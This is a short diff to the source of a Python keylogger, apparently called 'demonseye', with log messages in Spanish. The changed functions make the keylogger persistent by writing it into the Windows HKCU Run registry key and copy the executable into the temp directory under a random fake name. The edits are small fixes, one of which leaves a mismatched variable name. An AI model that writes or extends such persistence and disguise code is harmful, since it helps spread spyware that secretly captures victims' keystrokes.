@@ -761,7 +761,7 @@ def exit_demonseye():
 
 # Add the file to the startup registry key
 def add_keylogger_to_startup(exec_name):
-    if exec_name == "":
+    if exec_name == '':
         logging.debug('No hay nombre de fichero ejecutable. No añado al registro.')
         return False
     else:
@@ -771,18 +771,18 @@ def add_keylogger_to_startup(exec_name):
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
         except:
             key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
-        exec_name += exec_name + " -s"      # adds start option
+        exec_name += ' -s'      # adds start option
         winreg.SetValueEx(key, 'DEK', 0, winreg.REG_SZ, exec_name)
         winreg.CloseKey(key)
         return True
 
 
-# Replicate executable into temp directory and returns new fake filename
+# Replicate executable into temp directory and returns new random fake filename
 # Note that this is only effective with the compiled version on an .exe
 def self_replicate(exec_name):
-    if execname == "":
+    if execname == '':
         logging.debug('No hay nombre de ejecutable. No replica.')
-        return ""
+        return ''
     else:
         ext = '.exe'
         if os.path.splitext(exec_name)[1] == ext:
@@ -796,7 +796,7 @@ def self_replicate(exec_name):
             return fake_name
         else:
             logging.debug('No es un ejecutable. No replica {}'.format(execname))
-            return ""
+            return ''
 
 
 # Return Logging Level
